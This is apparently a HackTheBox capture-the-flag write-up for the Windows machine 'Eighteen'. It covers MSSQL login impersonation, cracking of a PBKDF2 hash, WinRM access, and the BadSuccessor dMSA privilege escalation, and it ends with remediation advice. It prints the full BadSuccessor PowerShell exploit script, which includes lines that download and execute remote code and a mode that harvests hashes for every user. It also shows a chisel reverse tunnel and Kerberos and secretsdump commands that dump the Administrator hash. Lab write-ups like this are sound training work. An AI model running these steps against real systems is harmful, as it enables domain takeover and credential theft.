# HackTheBox - Eighteen Writeup

**Machine:** Eighteen  
**IP Address:** 10.10.11.95  
**Difficulty:** Easy
**OS:** Windows

---

## Table of Contents

- [Reconnaissance](#reconnaissance)
- [Initial Access](#initial-access)
- [Privilege Escalation - User](#privilege-escalation---user)
- [Privilege Escalation - Root](#privilege-escalation---root)
- [Key Takeaways](#key-takeaways)
- [Tools Used](#tools-used)
- [Flags](#flags)
- [Remediation Recommendations](#remediation-recommendations)

---

## Reconnaissance

### Provided Credentials

- `kevin / iNa2we6haRj2gaw!`

### Nmap Results

```bash
nmap -p- eighteen.htb --min-rate 5000 -vvvv
```

**Open Services:**

- 80/tcp (IIS 10.0)
- 1433/tcp (MSSQL 2022)
- 5985/tcp (WinRM)

---

## Initial Access

### Web Application

Registered and logged into the site, but there was no immediate access path. SQL injection attempts failed.

### MSSQL Access

Connected to SQL Server with the provided credentials:

```bash
mssqlclient.py kevin:'iNa2we6haRj2gaw!'@10.10.11.95
```

Found a database named `financial_planner`.

Using `nxc`, identified that `kevin` could impersonate `appdev`:

```bash
nxc mssql 10.10.11.95 -u kevin -p 'iNa2we6haRj2gaw!' -M mssql_priv --local-auth
```

Impersonated `appdev` using `EXECUTE AS`:

```sql
-- Impersonar login (nivel servidor)
EXECUTE AS LOGIN = 'appdev';

-- Impersonar usuario (nivel base de datos)
EXECUTE AS USER = 'appdev';
```

### Hash Extraction and Cracking

Extracted a PBKDF2 hash from the `users` table and converted it to Hashcat format:

```python
#!/usr/bin/env python3

import base64
import sys

h = ''.join(sys.argv[1:])

if h is None or len(str(h).strip()) == 0:
    print('please provide the hash')
    exit(1)

taa = h.split(':')[:-1]

start = len(':'.join(taa) + ':')

# Salt
iterations = h[start:].split('$')[0]
salt = h[start:].split('$')[1]
sha = h[start:].split('$')[2]

salt_base64 = base64.b64encode(salt.encode()).decode()

# Hash
hash_hex = sha
hash_bytes = bytes.fromhex(hash_hex)
hash_base64 = base64.b64encode(hash_bytes).decode()

print(f'{taa[1]}:{iterations}:{salt_base64}:{hash_base64}')
```

Cracked with Hashcat:

```bash
hashcat -m 10900 hsh /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

**Recovered Password:**

- `admin:iloveyou1`

### RID Brute Force and WinRM Access

Enumerated users via RID brute force:

```bash
nxc mssql 10.10.11.95 -u kevin -p 'iNa2we6haRj2gaw!' --rid-brute --local-auth
```

Tested WinRM logins using the cracked password:

```bash
crackmapexec winrm 10.10.11.95 -u users -p 'iloveyou1' --continue-on-success
```

Authenticated to WinRM and retrieved the user flag:

```bash
evil-winrm -u adam.scott -p 'iloveyou1' -i 10.10.11.95
```

---

## Privilege Escalation - User

The machine is vulnerable to **CVE-2025-53779 (BadSuccessor)**. The following script was used for enumeration and exploitation:

```powershell
  <#
  BadSuccessor checks for prerequisits and attack abuse
  Research: https://www.akamai.com/blog/security-research/abusing-dmsa-for-
  privilege-escalation-in-active-directory
  Original Script: https://github.com/akamai/BadSuccessor/blob/main/Get-
  BadSuccessorOUPermissions.ps1
  Usage:

  runas /user:evilcorp.local\lowpriv /netonly powershell
  iex(new-object
  net.webclient).DownloadString("https://raw.githubusercontent.com/LuemmelSec/
  Pentest-Tools-
  Collection/refs/heads/main/tools/ActiveDirectory/BadSuccessor.ps1")
  BadSuccessor -mode check -Domain evilcorp.local
  BadSuccessor -mode exploit -Path "OU=BadSuccessor,DC=evilcorp,DC=local" -
  Name "bad_DMSA" -DelegatedAdmin "lowpriv" -DelegateTarget "Administrator" -
  domain "evilcorp.local"

  .\Rubeus.exe tgtdeleg /nowrap
  copy ticket
  .\Rubeus.exe asktgs /targetuser:bad_dmsa$ /service:krbtgt/evilcorp.local
  /opsec /dmsa /nowrap /ptt /ticket:<paste ticket> /outfile:ticket.kirbi

  then either request a tgs for a desired service as our targeted user
  (Administrator in that case):
  .\Rubeus.exe asktgs /user:bad_dmsa$ /service:cifs/dc2025.evilcorp.local
  /opsec /dmsa /nowrap /ptt /ticket:doIF4

  or convert to ccache file and proceed e.g. with impacket
  impacket-ticketConverter ticket.kirbi ticket.ccache
  KRB5CCNAME=ticket.ccache impacket-secretsdump
  evilcorp.local/bad_dmsa\$@dc2025.evilcorp.local -k -no-pass -just-dc-ntlm

  BadSuccessor -Mode GetThemHashes -Domain evilcorp.local -Path
  "OU=BadSuccessor,DC=evilcorp,DC=local" -DelegatedAdmin "lowpriv" -
  DelegateTarget "Administrator"
  Will automagically do all the sweet stuff for you:
  Create a dmsa per user
  Set the msDS-ManagedAccountPrecededByLink property accordinly
Fetch them hashes via Rubeus
Delete the dmsas
#>
function BadSuccessor {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [ValidateSet("Check", "Exploit", "GetThemHashes")]
        [string]$Mode,

        [Parameter(Mandatory)]
        [string]$Domain, # Domain name like evilcorp.local

        # Exploit and GetTHemHashes Mode parameters
        [string]$Path,
        [string]$DelegatedAdmin,
        [string]$DelegateTarget,
        [System.Management.Automation.PSCredential]$Credential,

        # Exploit only parameter
        [string]$Name
    )

    Import-Module ActiveDirectory

    if ($Mode -eq "Check") {
        function Resolve-ADIdentity {
            param (
                [string]$SID
            )
            try {
                $forest = Get-ADForest -Server $Domain
                $domains = $forest.Domains
            } catch {
                $domains = @($Domain)
            }

            foreach ($d in $domains) {
                try {
                    $user = Get-ADUser -Filter { SID -eq $SID } -Server $d -
ErrorAction SilentlyContinue
                    if ($user) { return "$d\$($user.SamAccountName)" }
                    $group = Get-ADGroup -Filter { SID -eq $SID } -Server $d
-ErrorAction SilentlyContinue
                    if ($group) { return "$d\$($group.SamAccountName)" }
                    $computer = Get-ADComputer -Filter { SID -eq $SID } -
Server $d -ErrorAction SilentlyContinue
                    if ($computer) { return "$d\$($computer.Name)$" }
                 } catch {}
             }
             try {
                 $sidObj = New-Object
System.Security.Principal.SecurityIdentifier($SID)
                $ntAccount =
$sidObj.Translate([System.Security.Principal.NTAccount]).Value
                return $ntAccount
             } catch {
                 return "NOT_RESOLVABLE"
             }
         }

         function Get-SIDFromIdentity {
             param ($IdentityReference)
             try {
                $user = Get-ADUser -Identity $IdentityReference -Server
$Domain -ErrorAction SilentlyContinue
                 if ($user) { return $user.SID.Value }
                 $group = Get-ADGroup -Identity $IdentityReference -Server
$Domain -ErrorAction SilentlyContinue
                if ($group) { return $group.SID.Value }
                $computer = Get-ADComputer -Identity $IdentityReference -
Server $Domain -ErrorAction SilentlyContinue
                 if ($computer) { return $computer.SID.Value }
             } catch {}
             return $IdentityReference
         }

         Write-Host "`n[+] Checking for Windows Server 2025 Domain
Controllers..." -ForegroundColor Cyan
        $dcs = Get-ADDomainController -Filter * -Server $Domain
         $dc2025 = $dcs | Where-Object { $_.OperatingSystem -like "*2025*" }
         if ($dc2025) {
            Write-Host "[!] Windows Server 2025 DCs found. BadSuccessor may
be exploitable!" -ForegroundColor Green
             $dc2025 | Select-Object HostName, OperatingSystem | Format-Table
         } else {
            Write-Host "[!] No 2025 Domain Controllers found. BadSuccessor
not exploitable!" -ForegroundColor Red
             $response = Read-Host "Do you want to continue anyway? (Y/N)"
             if ($response -notin @('y','Y','yes','YES')) {
                 Write-Host "Aborting script as requested." -ForegroundColor
Yellow
                return
            }
        }

        $domainSID = (Get-ADDomain -Server $Domain).DomainSID.Value
        $excludedSids = @(
            "$domainSID-512", "$domainSID-519", "S-1-5-32-544", "S-1-5-18"
        )
        $relevantRights = @('CreateChild', 'GenericAll', 'WriteDacl',
'WriteOwner')
        $relevantObjectTypes = @([Guid]::Empty, [Guid]'0feb936f-47b3-49f2-
9386-1dedc2c23765')
        $SidCache = @{}
        $NameCache = @{}

        function Test-IsExcludedSID {
            Param ([string]$IdentityReference)
            if ($SidCache.ContainsKey($IdentityReference)) {
                return $SidCache[$IdentityReference]
            }
            $sid = Get-SIDFromIdentity $IdentityReference
            $excluded = ($excludedSids -contains $sid -or
$sid.EndsWith('-519'))
            $SidCache[$IdentityReference] = $excluded
            return $excluded
        }

        $results = @()
        $ous = Get-ADOrganizationalUnit -Filter * -Server $Domain -
Properties DistinguishedName

        foreach ($ou in $ous) {
            $ldapPath = "LDAP://$Domain/$($ou.DistinguishedName)"
            try {
                $de = [ADSI]$ldapPath
                $sd = $de.psbase.ObjectSecurity
                $aces = $sd.GetAccessRules($true, $true,
[System.Security.Principal.SecurityIdentifier])
                foreach ($ace in $aces) {
                    if ($ace.AccessControlType -ne 'Allow') { continue }
                    if ($ace.PropagationFlags -eq
[System.Security.AccessControl.PropagationFlags]::InheritOnly) { continue }
                    $matchingRights = $relevantRights | Where-Object {
$ace.ActiveDirectoryRights.ToString() -match $_ }
                    if ($matchingRights.Count -eq 0) { continue }
                    if ($relevantObjectTypes -notcontains $ace.ObjectType) {
continue }

                      $sid = $ace.IdentityReference.Value
                      if (Test-IsExcludedSID $sid) { continue }

                      if (-not $NameCache.ContainsKey($sid)) {
                          $NameCache[$sid] = Resolve-ADIdentity $sid
                      }
                      foreach ($right in $matchingRights) {
                            $results += [PSCustomObject]@{
                                IdentitySID   = $sid
                                IdentityName   = $NameCache[$sid]
                                OU             = $ou.DistinguishedName
                                Right          = $right
                            }
                      }
                 }
                 $ownerSID = $sd.Owner.Value
                 if ($ownerSID -and -not (Test-IsExcludedSID $ownerSID)) {
                      if (-not $NameCache.ContainsKey($ownerSID)) {
                          $NameCache[$ownerSID] = Resolve-ADIdentity $ownerSID
                      }
                      $results += [PSCustomObject]@{
                            IdentitySID    = $ownerSID
                            IdentityName   = $NameCache[$ownerSID]
                            OU             = $ou.DistinguishedName
                            Right          = 'Owner'
                      }
                 }
             } catch {
                 Write-Warning "Failed OU: $($ou.DistinguishedName): $_"
                 continue
             }
        }
        $results | Sort-Object IdentityName | Out-GridView
    }

    elseif ($Mode -eq "Exploit") {
        if (-not ($Path -and $Name -and $DelegatedAdmin -and
$DelegateTarget)) {
            Write-Host "Missing required parameters for Exploit mode." -
ForegroundColor Red
            return
        }

        $domainNC = ([ADSI]"LDAP://$Domain/RootDSE").defaultNamingContext
        $fqdn = (($domainNC -split ",") -replace "^DC=" | Where-Object { $_
}) -join "."

        Write-Host "Creating dMSA at: LDAP://$Domain/$Path"
        $ldapPath = "LDAP://$Domain/$Path"
        $parentEntry = if ($Credential) {
            New-Object System.DirectoryServices.DirectoryEntry($ldapPath,
$Credential.UserName, $Credential.GetNetworkCredential().Password, "Secure")
        } else {
            New-Object System.DirectoryServices.DirectoryEntry($ldapPath)
        }

        $childName = "CN=$Name"
        $newChild = $parentEntry.Children.Add($childName, "msDS-
DelegatedManagedServiceAccount")
        $newChild.Properties["msDS-DelegatedMSAState"].Value = 2
        $newChild.Properties["msDS-ManagedPasswordInterval"].Value = 30
        $newChild.Properties["dnshostname"].Add("$Name.$fqdn")
        $newChild.Properties["samaccountname"].Add("$Name`$")
        $newChild.Properties["msDS-SupportedEncryptionTypes"].Value = 0x1C
        $newChild.Properties["userAccountControl"].Value = 0x1000

        # Resolve DelegateTarget
        try {
            $target = Get-ADUser -Identity $DelegateTarget -Server $Domain -
ErrorAction Stop
        } catch {
            $target = Get-ADComputer -Identity $DelegateTarget -Server
$Domain -ErrorAction Stop
        }
        $newChild.Properties["msDS-
ManagedAccountPrecededByLink"].Add($target.distinguishedName)

        # Resolve DelegatedAdmin SID
        try {
            $admin = Get-ADUser -Identity $DelegatedAdmin -Server $Domain -
ErrorAction Stop
        } catch {
            $admin = Get-ADComputer -Identity $DelegatedAdmin -Server
$Domain -ErrorAction Stop
        }
        $adminSID = $admin.SID.Value

        # Build Security Descriptor
        $rawSD = New-Object
System.Security.AccessControl.RawSecurityDescriptor "O:S-1-5-32-544D:
(A;;FA;;;$adminSID)"
        $descriptor = New-Object byte[] $rawSD.BinaryLength
          $rawSD.GetBinaryForm($descriptor, 0)
          $newChild.Properties["msDS-GroupMSAMembership"].Add($descriptor)

          $newChild.CommitChanges()
          Write-Host "Successfully created and configured dMSA '$Name'" -
ForegroundColor Green
        Write-Host "Object $delegatedadmin can now impersonate
$delegateTarget" -ForegroundColor Green
    }

        elseif ($Mode -eq "GetThemHashes") {
           Write-Warning "This mode requires Invoke-Rubeus module which will be
downloaded and imported. This is noisy and sus af. Only proceed if you know
what you're doing!"

          $response = Read-Host "Do you want to proceed with downloading and
importing Invoke-Rubeus? (y/n)"
          if ($response -ne 'y' -and $response -ne 'Y') {
            Write-Warning "Invoke-Rubeus import declined by user. Exiting
GetThemHashes."
               return
          }

          # Download and import Invoke-Rubeus from official source
          try {
               iex (New-Object
Net.WebClient).DownloadString('https://raw.githubusercontent.com/LuemmelSec/
Pentest-Tools-Collection/refs/heads/main/tools/ActiveDirectory/Invoke-
Rubeus.ps1')
               Write-Host "Invoke-Rubeus imported successfully." -
ForegroundColor Green
        } catch {
               Write-Warning "Failed to download or import Invoke-Rubeus: $_"
               return
          }
          if (-not ($Path -and $DelegatedAdmin)) {
               Write-Host "Missing required parameters for GetThemHashes mode."
-ForegroundColor Red
               return
          }

          $domainNC = ([ADSI]"LDAP://$Domain/RootDSE").defaultNamingContext
        $fqdn = (($domainNC -split ",") -replace "^DC=" | Where-Object { $_
}) -join "."
           $ldapPath = "LDAP://$Domain/$Path"

           $parentEntry = if ($Credential) {
            New-Object System.DirectoryServices.DirectoryEntry($ldapPath,
$Credential.UserName, $Credential.GetNetworkCredential().Password, "Secure")
           } else {
               New-Object System.DirectoryServices.DirectoryEntry($ldapPath)
           }

           $allTargets = @(
               Get-ADUser -Filter * -Server $Domain | Select @{n='DN';e=
{$_.DistinguishedName}}, SamAccountName
        )

           try {
            $admin = Get-ADUser -Identity $DelegatedAdmin -Server $Domain -
ErrorAction Stop
           } catch {
               $admin = Get-ADComputer -Identity $DelegatedAdmin -Server
$Domain -ErrorAction Stop
        }
           $adminSID = $admin.SID.Value

           # Capture the output of Rubeus as plain text string
           $tgtOutput = Invoke-Rubeus -Command "tgtdeleg /nowrap" | Out-String
           $lines = $tgtOutput -split "`r?`n"

           # Extract base64 line
           $found = $false
           $kirbiBase64 = $null
           foreach ($line in $lines) {
               if ($found -and $line.Trim() -ne "") {
                   $kirbiBase64 = $line.Trim()
                   break
               }
               if ($line -match '\[\*\] base64\(ticket\.kirbi\):') {
                   $found = $true
               }
           }

           if ($kirbiBase64) {
               Write-Host "`n[+] Extracted Base64 ticket:`n$kirbiBase64" -
ForegroundColor Green
           } else {
               Write-Warning "[-] Could not extract base64 ticket from Rubeus
output."
              return
          }

          # Initialize results array and list to track created dMSAs for
cleanup
          $results = @()
          $createdDMSAs = @()

          foreach ($target in $allTargets) {
              $name = "bad_$($target.SamAccountName)"

              try {
                 # Create dMSA
                 $childName = "CN=$name"
                 $newChild = $parentEntry.Children.Add($childName, "msDS-
DelegatedManagedServiceAccount")
                 $newChild.Properties["msDS-DelegatedMSAState"].Value = 2
                 $newChild.Properties["msDS-ManagedPasswordInterval"].Value =
30
                 [void]$newChild.Properties["dnshostname"].Add("$name.$fqdn")
                 [void]$newChild.Properties["samaccountname"].Add("$name`$")
                 $newChild.Properties["msDS-SupportedEncryptionTypes"].Value
= 0x1C
                 $newChild.Properties["userAccountControl"].Value = 0x1000
                 [void]$newChild.Properties["msDS-
ManagedAccountPrecededByLink"].Add($target.DN)

                 $rawSD = New-Object
System.Security.AccessControl.RawSecurityDescriptor "O:S-1-5-32-544D:
(A;;FA;;;$adminSID)"
                $descriptor = New-Object byte[] $rawSD.BinaryLength
                 $rawSD.GetBinaryForm($descriptor, 0)
                 [void]$newChild.Properties["msDS-
GroupMSAMembership"].Add($descriptor)

                 [void]$newChild.CommitChanges()

                 $createdDMSAs += $newChild

                 # Request hash with Rubeus
                 $res = Invoke-Rubeus -command "asktgs /targetuser:$name`$
/service:krbtgt/$Domain /opsec /dmsa /nowrap /ticket:$kirbiBase64"
                $rc4 = [regex]::Match($res, 'Previous Keys for .*?\$: \
(rc4_hmac\) ([A-F0-9]{32})').Groups[1].Value

                 if ($rc4) {
                      $results += [PSCustomObject]@{
                          SamAccountName = $target.SamAccountName
                          RC4Hash         = $rc4
                      }
                      Write-Host "Got hash for $($target.SamAccountName)" -
ForegroundColor Green
                  } else {
                    Write-Warning "RC4 hash not found for
$($target.SamAccountName)"
                  }

              } catch {
                  Write-Warning "Failed to process $($target.SamAccountName):
$_"
              }
          }

          # Cleanup - delete all created dMSAs
          foreach ($dmsa in $createdDMSAs) {
              try {
                  $dmsa.DeleteTree()
                  $dmsa.CommitChanges()
                  Write-Host "Deleted dMSA
$($dmsa.Properties['samaccountname'].Value)"
            } catch {
                  Write-Warning "Failed to delete dMSA
$($dmsa.Properties['samaccountname'].Value): $_"
              }
          }

          # Show results in gridview
          if ($results.Count -gt 0) {
              $results | Out-GridView -Title "Extracted RC4 Hashes"
          } else {
              Write-Warning "[-] No RC4 hashes were extracted."
          }
      }
}
```

Loaded the module and executed the exploit path for this environment:

```powershell
BadSuccessor -mode exploit -Path "OU=Staff,DC=eighteen,DC=htb" -Name "nory_dmsa" -DelegatedAdmin "adam.scott" -DelegateTarget "Administrator" -domain "eighteen.htb"
```

---

## Privilege Escalation - Root

### Pivoting with Chisel and Proxychains

On the attacker machine:

```bash
chisel server -p 8080 --reverse
```

On the victim:

```bash
chisel client <TU_IP>:8080 R:1080:socks
```

Proxychains configuration used:

```conf
  #G proxychains.conf      VER 4.x
  #
  #         HTTP, SOCKS4a, SOCKS5 tunneling proxifier with DNS.

  # The option below identifies how the ProxyList is treated.
  # only one option should be uncommented at time,
  # otherwise the last appearing option will be accepted
  #
  #dynamic_chain
  #
  # Dynamic - Each connection will be done via chained proxies
  # all proxies chained in the order as they appear in the list
# at least one proxy must be online to play in chain
# (dead proxies are skipped)
# otherwise EINTR is returned to the app
#
strict_chain
#
# Strict - Each connection will be done via chained proxies
# all proxies chained in the order as they appear in the list
# all proxies must be online to play in chain
# otherwise EINTR is returned to the app
#
#round_robin_chain
#
# Round Robin - Each connection will be done via chained proxies
# of chain_len length
# all proxies chained in the order as they appear in the list
# at least one proxy must be online to play in chain
# (dead proxies are skipped).
# the start of the current proxy chain is the proxy after the last
# proxy in the previously invoked proxy chain.
# if the end of the proxy chain is reached while looking for proxies
# start at the beginning again.
# otherwise EINTR is returned to the app
# These semantics are not guaranteed in a multithreaded environment.
#
#random_chain
#
# Random - Each connection will be done via random proxy
# (or proxy chain, see chain_len) from the list.
# this option is good to test your IDS :)

# Make sense only if random_chain or round_robin_chain
#chain_len = 2

# Quiet mode (no output from library)
#quiet_mode

## Proxy DNS requests - no leak for DNS data
# (disable all of the 3 items below to not proxy your DNS requests)

# method 1. this uses the proxychains4 style method to do remote dns:
# a thread is spawned that serves DNS requests and hands down an ip
# assigned from an internal list (via remote_dns_subnet).
# this is the easiest (setup-wise) and fastest method, however on
# systems with buggy libcs and very complex software like webbrowsers
# this might not work and/or cause crashes.
proxy_dns

# method 2. use the old proxyresolv script to proxy DNS requests
# in proxychains 3.1 style. requires `proxyresolv` in $PATH
# plus a dynamically linked `dig` binary.
# this is a lot slower than `proxy_dns`, doesn't support .onion URLs,
# but might be more compatible with complex software like webbrowsers.
#proxy_dns_old

# method 3. use proxychains4-daemon process to serve remote DNS requests.
# this is similar to the threaded `proxy_dns` method, however it requires
# that proxychains4-daemon is already running on the specified address.
# on the plus side it doesn't do malloc/threads so it should be quite
# compatible with complex, async-unsafe software.
# note that if you don't start proxychains4-daemon before using this,
# the process will simply hang.
#proxy_dns_daemon 127.0.0.1:1053

# set the class A subnet number to use for the internal remote DNS mapping
# we use the reserved 224.x.x.x range by default,
# if the proxified app does a DNS request, we will return an IP from that
range.
# on further accesses to this ip we will send the saved DNS name to the
proxy.
# in case some control-freak app checks the returned ip, and denies to
# connect, you can use another subnet, e.g. 10.x.x.x or 127.x.x.x.
# of course you should make sure that the proxified app does not need
# *real* access to this subnet.
# i.e. dont use the same subnet then in the localnet section
#remote_dns_subnet 127
#remote_dns_subnet 10
remote_dns_subnet 224

# Some timeouts in milliseconds
tcp_read_time_out 15000
tcp_connect_time_out 8000

### Examples for localnet exclusion
## localnet ranges will *not* use a proxy to connect.
## note that localnet works only when plain IP addresses are passed to the
app,
## the hostname resolves via /etc/hosts, or proxy_dns is disabled or
proxy_dns_old used.

## Exclude connections to 192.168.1.0/24 with port 80
# localnet 192.168.1.0:80/255.255.255.0
## Exclude connections to 192.168.100.0/24
# localnet 192.168.100.0/255.255.255.0

## Exclude connections to ANYwhere with port 80
# localnet 0.0.0.0:80/0.0.0.0
# localnet [::]:80/0

## RFC6890 Loopback address range
## if you enable this, you have to make sure remote_dns_subnet is not 127
## you'll need to enable it if you want to use an application that
## connects to localhost.
# localnet 127.0.0.0/255.0.0.0
# localnet ::1/128

## RFC1918 Private Address Ranges
# localnet 10.0.0.0/255.0.0.0
# localnet 172.16.0.0/255.240.0.0
# localnet 192.168.0.0/255.255.0.0

### Examples for dnat
## Trying to proxy connections to destinations which are dnatted,
## will result in proxying connections to the new given destinations.
## Whenever I connect to 1.1.1.1 on port 1234 actually connect to 1.1.1.2 on
port 443
# dnat 1.1.1.1:1234    1.1.1.2:443

## Whenever I connect to 1.1.1.1 on port 443 actually connect to 1.1.1.2 on
port 443
## (no need to write :443 again)
# dnat 1.1.1.2:443    1.1.1.2

## No matter what port I connect to on 1.1.1.1 port actually connect to
1.1.1.2 on port 443
# dnat 1.1.1.1   1.1.1.2:443

## Always, instead of connecting to 1.1.1.1, connect to 1.1.1.2
# dnat 1.1.1.1 1.1.1.2

# ProxyList format
#       type ip port [user pass]
#       (values separated by 'tab' or 'blank')
#
#       only numeric ipv4 addresses are valid
#
#
  #         Examples:
  #
  #                   socks5 192.168.67.78           1080     lamer    secret
  #         http      192.168.89.3   8080            justu    hidden
  #         socks4    192.168.1.49     1080
  #             http      192.168.39.93       8080
  #
  #
  #         proxy types: http, socks4, socks5, raw
  #          * raw: The traffic is simply forwarded to the proxy without
  modification.
  #        ( auth types supported: "basic"-http              "user/pass"-socks )
  #
  [ProxyList]
  # add proxy here ...
  # meanwile
  # defaults set to "tor"
  #socks4          127.0.0.1 9050
  socks5    127.0.0.1 1080
```

### Kerberos Ticket Operations

Upgraded Impacket and synchronized time with the target if needed:

```bash
pip3 install impacket --upgrade
sudo timedatectl set-time "$(date -d "$(curl -s -I http://10.10.11.95| grep -i '^Date:' | cut -d' ' -f2-)" '+%Y-%m-%d %H:%M:%S')"
```

Requested a ticket as the delegated managed service account:

```bash
proxychains ~/.local/bin/getST.py eighteen.htb/adam.scott:iloveyou1 -impersonate "nory_dmsa$" -dc-ip 10.10.11.95 -self -dmsa
```

Exported the ticket:

```bash
export KRB5CCNAME='nory_dmsa$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache'
```

Dumped the Administrator hash:

```bash
proxychains -q impacket-secretsdump -k -no-pass dc01.eighteen.htb -just-dc-user Administrator -dc-ip 10.10.11.95
```

Logged in as Administrator:

```bash
evil-winrm -u administrator -H 0b133be956bfaddf9cea56701affddec -i 10.10.11.95
```

One-line alternatives for time sync and ticketing were noted in the PDF.

---

## Key Takeaways

1. SQL impersonation can expose sensitive data and credentials even with limited initial access.
2. Weak admin passwords can be cracked from database hashes to unlock WinRM access.
3. BadSuccessor (CVE-2025-53779) enables escalation via DMSA abuse and Kerberos delegation.
4. Time synchronization is critical for Kerberos-based attacks.
5. Proxychains and SOCKS tunneling enable tooling against internal AD services.

---

## Tools Used

- nmap
- mssqlclient.py (Impacket)
- nxc
- hashcat
- crackmapexec
- evil-winrm
- BadSuccessor (PowerShell)
- Rubeus (referenced in BadSuccessor workflow)
- chisel
- proxychains
- getST.py (Impacket)
- impacket-secretsdump

---

## Flags

**User Flag:** Retrieved via WinRM as `adam.scott` (value not recorded in PDF)  
**Root Flag:** Retrieved after Administrator access (value not recorded in PDF)

---

## Remediation Recommendations

### Critical Severity

1. **Fix DMSA Delegation Abuse (CVE-2025-53779 / BadSuccessor)**

   - **Issue:** AD delegation permissions allow creation/abuse of DMSA objects.
   - **Impact:** Domain escalation via Kerberos delegation and ticket abuse.
   - **Remediation:**
     - Apply vendor patches and guidance for CVE-2025-53779.
     - Audit OU permissions for `CreateChild`, `WriteDacl`, `GenericAll`, and `WriteOwner`.
     - Restrict who can create or modify managed service accounts.

2. **Harden SQL Server Impersonation**

   - **Issue:** `EXECUTE AS` allowed escalation from `kevin` to `appdev`.
   - **Impact:** Access to sensitive DB data and credential material.
   - **Remediation:**
     - Remove unnecessary impersonation privileges.
     - Enforce least-privilege database roles and ownership chaining rules.

### High Severity

3. **Enforce Strong Passwords for Admin Accounts**

   - **Issue:** `admin:iloveyou1` was easily crackable.
   - **Impact:** WinRM access and lateral movement.
   - **Remediation:**
     - Enforce strong password policy and MFA for privileged accounts.
     - Monitor for password reuse across services.

4. **Secure WinRM Access**

   - **Issue:** WinRM exposed to cracked credentials.
   - **Impact:** Remote shell access to the domain environment.
   - **Remediation:**
     - Restrict WinRM to admin-only networks or privileged jump hosts.
     - Require MFA or certificate-based authentication for WinRM.

### Medium Severity

5. **Kerberos Time Sync and Ticket Hygiene**

   - **Issue:** Time skew and ticket handling enabled direct Kerberos abuse.
   - **Impact:** Ticket forgery and pass-the-ticket abuse.
   - **Remediation:**
     - Enforce secure NTP and monitor for time drift.
     - Log and alert on unusual TGS/TGT requests.

6. **Limit AD Enumeration and RID Brute Force**

   - **Issue:** RID brute force exposed users and facilitated credential testing.
   - **Impact:** Increased attack surface for credential attacks.
   - **Remediation:**
     - Restrict anonymous or low-privileged enumeration.
     - Monitor for excessive RID lookups.
